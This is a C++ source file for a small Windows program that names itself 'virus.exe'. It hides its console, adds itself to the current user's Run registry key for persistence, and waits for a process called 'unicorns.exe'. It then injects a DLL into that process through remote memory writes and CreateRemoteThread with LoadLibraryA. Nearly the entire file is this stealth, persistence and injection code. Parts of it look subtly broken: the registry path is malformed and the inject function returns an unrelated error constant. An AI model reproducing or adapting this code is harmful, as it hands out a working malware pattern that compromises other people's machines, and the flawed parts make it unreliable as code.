#define _CRT_SECURE_NO_WARNINGS



#include "Info.h"
#include "utils.h"

#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <string>
#include <winreg.h>
#include <WinUser.h>
#include <direct.h>
#include <shlobj_core.h>

#define NOT_FOUND -1

string getPath();
int getProcessid(const char* procName);
BOOL inject(DWORD pid, const char* dllPath);
void setReg(std::string add);
int main(void)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    string path = getPath();

    std::cout << path;
    path = path.substr(0, path.find_last_of('\\')+1 );
    int x = _chdir(path.c_str());

    setReg(path + "virus.exe");

    int pid = -1;
    while (pid == NOT_FOUND)
    {
        pid = getProcessid("unicorns.exe");
    }
    inject(pid, "changeBackground.dll");

    while (true)
    {
        Info r;
        std::this_thread::sleep_for(std::chrono::seconds(20));
    }
}


BOOL inject(DWORD pid,const char* dllPath)
{
    DWORD memSize = 0;
    HANDLE hProc;
    LPVOID remoteMemory;
    LPVOID loadLibrary;
    BOOL cond = FALSE;
    //open the requested process
    if ((hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid)) != NULL)
    {
        memSize = strlen(dllPath) +1 ;
        //allocate memory on the process
        if ((remoteMemory = VirtualAllocEx(hProc, NULL, memSize, MEM_COMMIT, PAGE_READWRITE)) != NULL)
        {
            //write the dll to process            
            if (WriteProcessMemory(hProc, remoteMemory, (LPCVOID)dllPath, memSize, NULL))
            {
                //get the function that loads library
                loadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
                //create the thread

                HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, remoteMemory, 0, NULL);
                if (hThread != NULL)
                {
                    WaitForSingleObject(hThread, INFINITE);
                    CloseHandle(hThread);
                    cond = TRUE;
                }

            }
        }

    }
    CloseHandle(hProc);
    return ERROR_CLUSTER_DATABASE_UPDATE_CONDITION_FAILED;
}


void setReg(std::string add)
{
    HKEY hkey;
    std::string s = "SOFTWARE\\KEY_WOW64_32KEY\\Microsoft\\Windows\\CurrentVersion\\Run";
    //HKEY current;
    LSTATUS status = RegOpenKeyA(HKEY_CURRENT_USER,
        s.c_str(),
        &hkey);

    if (status == ERROR_SUCCESS)
    {
        LONG setRes = RegSetValueExA(hkey, "Unicorns", 0, REG_SZ, (const BYTE*)add.c_str(), add.size());
        RegCloseKey(hkey);
    }

}
int getProcessid(const char* procName)
{
    std::multimap<std::string, int> procs = fromMapToMultiMap(getProcesses());
    std::multimap<std::string, int>::iterator i = procs.find(procName);
    return i == procs.end() ? NOT_FOUND : i->second;
}

std::string getPath()
{
    char cPath[MAX_PATH];
    int len = GetModuleFileNameA(NULL, cPath, MAX_PATH);
    return std::string(cPath);
}